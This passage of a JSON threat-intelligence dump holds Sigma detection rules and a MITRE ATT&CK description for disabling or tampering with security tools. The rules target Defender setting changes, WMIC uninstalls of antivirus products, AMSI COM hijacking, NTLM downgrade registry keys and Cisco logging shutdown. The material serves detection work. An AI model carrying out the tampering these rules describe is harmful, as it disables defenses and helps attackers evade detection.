                            "raw": "author: Bhabesh Raj, Nasreddine Bencherchali\ndate: 2021/07/05\ndescription: Detects blocked attempts to change any of Defender's settings such as\n  \"Real Time Monitoring\" and \"Behavior Monitoring\"\ndetection:\n  condition: selection\n  selection:\n    EventID: 5013\n    Value|endswith:\n    - \\Windows Defender\\DisableAntiSpyware\n    - \\Windows Defender\\DisableAntiVirus\n    - \\Windows Defender\\Scan\\DisableArchiveScanning\n    - \\Windows Defender\\Scan\\DisableScanningNetworkFiles\n    - \\Real-Time Protection\\DisableRealtimeMonitoring\n    - \\Real-Time Protection\\DisableBehaviorMonitoring\n    - \\Real-Time Protection\\DisableIOAVProtection\n    - \\Real-Time Protection\\DisableScriptScanning\nfalsepositives:\n- Administrator might try to disable defender features during testing (must be investigated)\nid: 49e5bc24-8b86-49f1-b743-535f332c2856\nlevel: high\nlogsource:\n  product: windows\n  service: windefend\nmodified: 2022/12/06\nreferences:\n- https://bhabeshraj.com/post/tampering-with-microsoft-defenders-tamper-protection\n- https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Microsoft Defender Tamper Protection Trigger\n",
                            "sigma:id": "49e5bc24-8b86-49f1-b743-535f332c2856",
                            "title": "Microsoft Defender Tamper Protection Trigger",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7b544661-69fc-419f-9a59-82ccc328f205",
                        "lookup_data": {
                            "description": "Detects Registry modifications performed by Ke3chang malware in campaigns running in 2019 and 2020",
                            "raw": "author: Markus Neis, Swisscom\ndate: 2020/06/18\ndescription: Detects Registry modifications performed by Ke3chang malware in campaigns\n  running in 2019 and 2020\ndetection:\n  condition: selection1\n  selection1:\n    CommandLine|contains:\n    - -Property DWORD -name DisableFirstRunCustomize -value 2 -Force\n    - -Property String -name Check_Associations -value\n    - -Property DWORD -name IEHarden -value 0 -Force\nfalsepositives:\n- Will need to be looked for combinations of those processes\nid: 7b544661-69fc-419f-9a59-82ccc328f205\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.verfassungsschutz.de/embed/broschuere-2020-06-bfv-cyber-brief-2020-01.pdf\n- https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/\nstatus: test\ntags:\n- attack.g0004\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Ke3chang Registry Key Modifications\n",
                            "sigma:id": "7b544661-69fc-419f-9a59-82ccc328f205",
                            "title": "Ke3chang Registry Key Modifications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "07330162-dba1-4746-8121-a9647d49d297",
                        "lookup_data": {
                            "description": "Detects AWS Config Service disabling",
                            "raw": "author: vitaliy0x1\ndate: 2020/01/21\ndescription: Detects AWS Config Service disabling\ndetection:\n  condition: selection_source\n  selection_source:\n    eventName:\n    - DeleteDeliveryChannel\n    - StopConfigurationRecorder\n    eventSource: config.amazonaws.com\nfalsepositives:\n- Valid change in AWS Config Service\nid: 07330162-dba1-4746-8121-a9647d49d297\nlevel: high\nlogsource:\n  product: aws\n  service: cloudtrail\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: AWS Config Disabling Channel/Recorder\n",
                            "sigma:id": "07330162-dba1-4746-8121-a9647d49d297",
                            "title": "AWS Config Disabling Channel/Recorder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "847d5ff3-8a31-4737-a970-aeae8fe21765",
                        "lookup_data": {
                            "description": "Detects uninstallation or termination of security products using the WMIC utility",
                            "raw": "author: Florian Roth (Nextron Systems), Nasreddine Bencherchali\ndate: 2021/01/30\ndescription: Detects uninstallation or termination of security products using the\n  WMIC utility\ndetection:\n  condition: 1 of selection_cli_* and selection_product\n  selection_cli_1:\n    CommandLine|contains|all:\n    - wmic\n    - 'product where '\n    - call uninstall\n    - /nointeractive\n  selection_cli_2:\n    CommandLine|contains:\n    - call delete\n    - call terminate\n    CommandLine|contains|all:\n    - wmic\n    - 'caption like '\n  selection_cli_3:\n    CommandLine|contains|all:\n    - 'process '\n    - 'where '\n    - delete\n  selection_product:\n    CommandLine|contains:\n    - '%carbon%'\n    - '%cylance%'\n    - '%endpoint%'\n    - '%eset%'\n    - '%malware%'\n    - '%Sophos%'\n    - '%symantec%'\n    - Antivirus\n    - 'AVG '\n    - Carbon Black\n    - CarbonBlack\n    - Cb Defense Sensor 64-bit\n    - Crowdstrike Sensor\n    - 'Cylance '\n    - Dell Threat Defense\n    - DLP Endpoint\n    - Endpoint Detection\n    - Endpoint Protection\n    - Endpoint Security\n    - Endpoint Sensor\n    - ESET File Security\n    - LogRhythm System Monitor Service\n    - Malwarebytes\n    - McAfee Agent\n    - Microsoft Security Client\n    - Sophos Anti-Virus\n    - Sophos AutoUpdate\n    - Sophos Credential Store\n    - Sophos Management Console\n    - Sophos Management Database\n    - Sophos Management Server\n    - Sophos Remote Management System\n    - Sophos Update Manager\n    - Threat Protection\n    - VirusScan\n    - Webroot SecureAnywhere\n    - Windows Defender\nfalsepositives:\n- Legitimate administration\nid: 847d5ff3-8a31-4737-a970-aeae8fe21765\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/26\nreferences:\n- https://twitter.com/cglyer/status/1355171195654709249\n- https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n- https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions\n- https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n- https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Potential Tampering With Security Products Via WMIC\n",
                            "sigma:id": "847d5ff3-8a31-4737-a970-aeae8fe21765",
                            "title": "Potential Tampering With Security Products Via WMIC",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f44800ac-38ec-471f-936e-3fa7d9c53100",
                        "lookup_data": {
                            "description": "Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.",
                            "raw": "author: Nasreddine Bencherchali @nas_bench\ndate: 2021/12/18\ndescription: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|endswith: \\SepRemovalToolNative_x64.exe\n  selection2:\n    CommandLine|contains: --uninstall\n    Image|endswith: \\CATClean.exe\n  selection3:\n    CommandLine|contains: -r\n    Image|endswith: \\NetInstaller.exe\n  selection4:\n    CommandLine|contains|all:\n    - /uninstall\n    - /enterprise\n    Image|endswith: \\WFPUnins.exe\nfalsepositives:\n- Legitimate administrative use (Should be investigated either way)\nid: f44800ac-38ec-471f-936e-3fa7d9c53100\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/02\nreferences:\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: CleanWipe Usage\n",
                            "sigma:id": "f44800ac-38ec-471f-936e-3fa7d9c53100",
                            "title": "CleanWipe Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a982fc9c-6333-4ffb-a51d-addb04e8b529",
                        "lookup_data": {
                            "description": "Detects the Setting of Windows Defender Exclusions",
                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/07/06\ndescription: Detects the Setting of Windows Defender Exclusions\ndetection:\n  condition: selection2\n  selection2:\n    EventType: SetValue\n    TargetObject|contains: \\Microsoft\\Windows Defender\\Exclusions\nfalsepositives:\n- Administrator actions\nid: a982fc9c-6333-4ffb-a51d-addb04e8b529\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://twitter.com/_nullbind/status/1204923340810543109\nrelated:\n- id: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Exclusions Added - Registry\n",
                            "sigma:id": "a982fc9c-6333-4ffb-a51d-addb04e8b529",
                            "title": "Windows Defender Exclusions Added - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a",
                        "lookup_data": {
                            "description": "Detects commands that temporarily turn off Volume Snapshots",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/01/28\ndescription: Detects commands that temporarily turn off Volume Snapshots\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - reg\n    - ' add '\n    - \\Services\\VSS\\Diag\n    - /d Disabled\nfalsepositives:\n- Legitimate administration\nid: dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/0gtweet/status/1354766164166115331\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disabled Volume Snapshots\n",
                            "sigma:id": "dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a",
                            "title": "Disabled Volume Snapshots",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
                        "lookup_data": {
                            "description": "Cyberattack on fuel supplier causes supply chain disruption",
                            "link": "http://www.botvrij.eu/data/feed-osint/cdc842aa-761d-48e2-9b97-c344bed8b3a8.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1644231782",
                            "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7d995e63-ec83-4aa3-89d5-8a17b5c87c86",
                        "lookup_data": {
                            "description": "Detects enabling TurnOffCheck which can be used to bypass defense of MSDT Follina vulnerability",
                            "raw": "author: Christopher Peacock @securepeacock, SCYTHE @scythe_io\ndate: 2022/06/15\ndescription: Detects enabling TurnOffCheck which can be used to bypass defense of\n  MSDT Follina vulnerability\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: \\Policies\\Microsoft\\Windows\\ScriptedDiagnostics\\TurnOffCheck\nfalsepositives:\n- Administrator actions\nid: 7d995e63-ec83-4aa3-89d5-8a17b5c87c86\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/09/09\nreferences:\n- https://twitter.com/wdormann/status/1537075968568877057?s=20&t=0lr18OAnmAGoGpma6grLUw\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Scripted Diagnostics Turn Off Check Enabled - Registry\n",
                            "sigma:id": "7d995e63-ec83-4aa3-89d5-8a17b5c87c86",
                            "title": "Scripted Diagnostics Turn Off Check Enabled - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ac08589e-ee59-4935-8667-d845e38fe579",
                        "lookup_data": {
                            "capec": "CAPEC-578",
                            "mitre-attack-id": "T1562.001",
                            "mitre-cti:description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                            "mitre-cti:name": "Disable or Modify Tools",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-24T15:23:59.433Z', 'name': 'Disable or Modify Tools', 'description': 'Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\\n\\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)\\n\\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\\n\\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\\n\\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.\\n\\nLack of expected log events may be suspicious.', 'x_mitre_platforms': ['Windows', 'macOS', 'Linux', 'Containers', 'IaaS'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.3', 'x_mitre_contributors': ['Gordon Long, Box, Inc., @ethicalhax', 'Ziv Karliner, @ziv_kr, Team Nautilus Aqua Security', 'Nathaniel Quist, Palo Alto Networks', 'Gal Singer, @galsinger29, Team Nautilus Aqua Security', 'Daniel Feichter, @VirtualAllocEx, Infosec Tirol', 'Lucas Heiligenstein', 'Cian Heasley', 'Alex Soler, AttackIQ', 'Sarathkumar Rajendran, Microsoft Defender365'], 'x_mitre_data_sources': ['Windows Registry: Windows Registry Key Deletion', 'Driver: Driver Load', 'Windows Registry: Windows Registry Key Modification', 'Service: Service Metadata', 'Command: Command Execution', 'Process: Process Termination', 'Sensor Health: Host Status'], 'x_mitre_defense_bypassed': ['Anti-virus', 'Log analysis', 'Signature-based detection', 'Host intrusion prevention systems', 'File monitoring'], 'type': 'attack-pattern', 'id': 'attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579', 'created': '2020-02-21T20:32:20.810Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1562/001', 'external_id': 'T1562.001'}, {'source_name': 'OutFlank System Calls', 'description': 'de Plaa, C. (2019, June 19). Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR. Retrieved September 29, 2021.', 'url': 'https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/'}, {'source_name': 'chasing_avaddon_ransomware', 'description': 'Hernandez, A. S. Tarter, P. Ocamp, E. J. (2022, January 19). One Source to Rule Them All: Chasing AVADDON Ransomware. Retrieved January 26, 2022.', 'url': 'https://www.mandiant.com/resources/chasing-avaddon-ransomware'}, {'source_name': 'doppelpaymer_crowdstrike', 'description': 'Hurley, S. (2021, December 7). Critical Hit: How DoppelPaymer Hunts and Kills Windows Processes. Retrieved January 26, 2022.', 'url': 'https://www.crowdstrike.com/blog/how-doppelpaymer-hunts-and-kills-windows-processes/'}, {'source_name': 'avoslocker_ransomware', 'description': 'Lakshmanan, R. (2022, May 2). AvosLocker Ransomware Variant Using New Trick to Disable Antivirus Protection. Retrieved May 17, 2022.', 'url': 'https://thehackernews.com/2022/05/avoslocker-ransomware-variant-using-new.html'}, {'source_name': 'dharma_ransomware', 'description': 'Loui, E. Scheuerman, K. et al. (2020, April 16). Targeted Dharma Ransomware Intrusions Exhibit Consistent Techniques. Retrieved January 26, 2022.', 'url': 'https://www.crowdstrike.com/blog/targeted-dharma-ransomware-intrusions-exhibit-consistent-techniques/'}, {'source_name': 'MDSec System Calls', 'description': 'MDSec Research. (2020, December). Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams. Retrieved September 29, 2021.', 'url': 'https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/'}, {'source_name': 'SCADAfence_ransomware', 'description': 'Shaked, O. (2020, January 20). Anatomy of a Targeted Ransomware Attack. Retrieved June 18, 2022.', 'url': 'https://cdn.logic-control.com/docs/scadafence/Anatomy-Of-A-Targeted-Ransomware-Attack-WP.pdf'}, {'source_name': 'demystifying_ryuk', 'description': 'Tran, T. (2020, November 24). Demystifying Ransomware Attacks Against Microsoft Defender Solution. Retrieved January 26, 2022.', 'url': 'https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-ransomware-attacks-against-microsoft-defender/ba-p/1928947'}, {'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/578.html', 'external_id': 'CAPEC-578'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0372e1f9-0fd2-40f7-be1b-a7b2b848fa7b",
                        "lookup_data": {
                            "description": "Detects registry modifications that disable Privacy Settings Experience",
                            "raw": "author: frack113\ndate: 2022/10/02\ndescription: Detects registry modifications that disable Privacy Settings Experience\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith: \\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience\nfalsepositives:\n- Legitimate admin script\nid: 0372e1f9-0fd2-40f7-be1b-a7b2b848fa7b\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1562.001/T1562.001.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Privacy Settings Experience in Registry\n",
                            "sigma:id": "0372e1f9-0fd2-40f7-be1b-a7b2b848fa7b",
                            "title": "Disable Privacy Settings Experience in Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6a5f68d1-c4b5-46b9-94ee-5324892ea939",
                        "lookup_data": {
                            "description": "Detects the uninstallation of Sysinternals Sysmon, which could be the result of legitimate administration or a manipulation for defense evasion",
                            "raw": "author: frack113\ndate: 2022/01/12\ndescription: Detects the uninstallation of Sysinternals Sysmon, which could be the\n  result of legitimate administration or a manipulation for defense evasion\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: -u\n    Image|endswith:\n    - \\Sysmon64.exe\n    - \\Sysmon.exe\nfalsepositives:\n- Unknown\nid: 6a5f68d1-c4b5-46b9-94ee-5324892ea939\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-11---uninstall-sysmon\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Uninstall Sysinternals Sysmon\n",
                            "sigma:id": "6a5f68d1-c4b5-46b9-94ee-5324892ea939",
                            "title": "Uninstall Sysinternals Sysmon",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "42205c73-75c8-4a63-9db1-e3782e06fda0",
                        "lookup_data": {
                            "description": "Detects applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/05\ndescription: Detects applications being added to the \"allowed applications\" list of\n  exploit guard in order to bypass controlled folder settings\ndetection:\n  condition: all of selection_*\n  selection_key:\n    EventType: SetValue\n    TargetObject|contains: SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit\n      Guard\\Controlled Folder Access\\AllowedApplications\n  selection_paths:\n    TargetObject|contains:\n    - \\Users\\Public\\\n    - \\AppData\\Local\\Temp\\\n    - \\Desktop\\\n    - \\PerfLogs\\\n    - \\Windows\\Temp\\\nfalsepositives:\n- Unlikely\nid: 42205c73-75c8-4a63-9db1-e3782e06fda0\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://www.microsoft.com/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Suspicious Application Allowed Through Exploit Guard\n",
                            "sigma:id": "42205c73-75c8-4a63-9db1-e3782e06fda0",
                            "title": "Suspicious Application Allowed Through Exploit Guard",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1321dc4e-a1fe-481d-a016-52c45f0c8b4f",
                        "lookup_data": {
                            "description": "Detects the Setting of Windows Defender Exclusions",
                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/07/06\ndescription: Detects the Setting of Windows Defender Exclusions\ndetection:\n  condition: selection\n  selection:\n    EventID: 5007\n    NewValue|contains: \\Microsoft\\Windows Defender\\Exclusions\nfalsepositives:\n- Administrator actions\nid: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\nlevel: medium\nlogsource:\n  product: windows\n  service: windefend\nmodified: 2022/12/06\nreferences:\n- https://twitter.com/_nullbind/status/1204923340810543109\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Exclusions Added\n",
                            "sigma:id": "1321dc4e-a1fe-481d-a016-52c45f0c8b4f",
                            "title": "Windows Defender Exclusions Added",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
                        "lookup_data": {
                            "description": "Detects NetNTLM downgrade attack",
                            "raw": "author: Florian Roth (Nextron Systems), wagga\ndate: 2018/03/20\ndescription: Detects NetNTLM downgrade attack\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains|all:\n    - SYSTEM\\\n    - ControlSet\n    - \\Control\\Lsa\n    TargetObject|endswith:\n    - \\lmcompatibilitylevel\n    - \\NtlmMinClientSec\n    - \\RestrictSendingNTLMTraffic\nfalsepositives:\n- Unknown\nid: d67572a0-e2ec-45d6-b8db-c100d14b8ef2\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1112\ntitle: NetNTLM Downgrade Attack - Registry\n",
                            "sigma:id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
                            "title": "NetNTLM Downgrade Attack - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "160d2780-31f7-4922-8b3a-efce30e63e96",
                        "lookup_data": {
                            "description": "Detects changes to the AMSI come server registry key in order disable AMSI scanning functionalities. When AMSI attempts to starts its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/04\ndescription: Detects changes to the AMSI come server registry key in order disable\n  AMSI scanning functionalities. When AMSI attempts to starts its COM component, it\n  will query its registered CLSID and return a non-existent COM server. This causes\n  a load failure and prevents any scanning methods from being accessed, ultimately\n  rendering AMSI useless\ndetection:\n  condition: selection and not filter\n  filter:\n    Details: '%windir%\\system32\\amsi.dll'\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: \\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\(Default)\nfalsepositives:\n- Unknown\nid: 160d2780-31f7-4922-8b3a-efce30e63e96\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n- https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#amsi-comreg-bypass\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Potential AMSI COM Server Hijacking\n",
                            "sigma:id": "160d2780-31f7-4922-8b3a-efce30e63e96",
                            "title": "Potential AMSI COM Server Hijacking",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "85c312b7-f44d-4a51-a024-d671c40b49fc",
                        "lookup_data": {
                            "description": "Detects when attackers use \"sc.exe\" or the powershell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\"",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/01\ndescription: Detects when attackers use \"sc.exe\" or the powershell \"Set-Service\" cmdlet\n  to change the startup type of a service to \"disabled\"\ndetection:\n  condition: all of selection_sc_* or selection_pwsh\n  selection_pwsh:\n    CommandLine|contains:\n    - Disabled\n    - Manual\n    CommandLine|contains|all:\n    - Set-Service\n    - -StartupType\n  selection_sc_cli:\n    CommandLine|contains:\n    - disabled\n    - demand\n    CommandLine|contains|all:\n    - ' config '\n    - start\n  selection_sc_img:\n  - Image|endswith: \\sc.exe\n  - OriginalFileName: sc.exe\nfalsepositives:\n- Administrators settings a service to disable via script or cli for testing purposes\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Sc Or Set-Service Cmdlet Execution to Disable Services\n",
                            "sigma:id": "85c312b7-f44d-4a51-a024-d671c40b49fc",
                            "title": "Sc Or Set-Service Cmdlet Execution to Disable Services",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9e8f6035-88bf-4a63-96b6-b17c0508257e",
                        "lookup_data": {
                            "description": "Turn off logging locally or remote",
                            "raw": "author: Austin Clark\ndate: 2019/08/11\ndescription: Turn off logging locally or remote\ndetection:\n  condition: keywords\n  keywords:\n  - no logging\n  - no aaa new-model\nfalsepositives:\n- Unknown\nfields:\n- src\n- CmdSet\n- User\n- Privilege_Level\n- Remote_Address\nid: 9e8f6035-88bf-4a63-96b6-b17c0508257e\nlevel: high\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Cisco Disabling Logging\n",
                            "sigma:id": "9e8f6035-88bf-4a63-96b6-b17c0508257e",
                            "title": "Cisco Disabling Logging",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a3ab73f1-bd46-4319-8f06-4b20d0617886",
                        "lookup_data": {
                            "description": "Detects when someone is adding or removing applications or folder from exploit guard \"ProtectedFolders\" and \"AllowedApplications\"",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/05\ndescription: Detects when someone is adding or removing applications or folder from\n  exploit guard \"ProtectedFolders\" and \"AllowedApplications\"\ndetection:\n  allowed_apps_key:\n    EventID: 5007\n    NewValue|contains: \\Windows Defender\\Windows Defender Exploit Guard\\Controlled\n      Folder Access\\AllowedApplications\\\n  allowed_apps_path:\n    NewValue|contains:\n    - \\Users\\Public\\\n    - \\AppData\\Local\\Temp\\\n    - \\Desktop\\\n    - \\PerfLogs\\\n    - \\Windows\\Temp\\\n  condition: all of allowed_apps* or protected_folders\n  protected_folders:\n    EventID: 5007\n    OldValue|contains: \\Windows Defender\\Windows Defender Exploit Guard\\Controlled\n      Folder Access\\ProtectedFolders\\\nfalsepositives:\n- Unlikely\nid: a3ab73f1-bd46-4319-8f06-4b20d0617886\nlevel: high\nlogsource:\n  product: windows\n  service: windefend\nmodified: 2022/12/06\nreferences:\n- https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088\nstatus: experimental\ntags:\n- 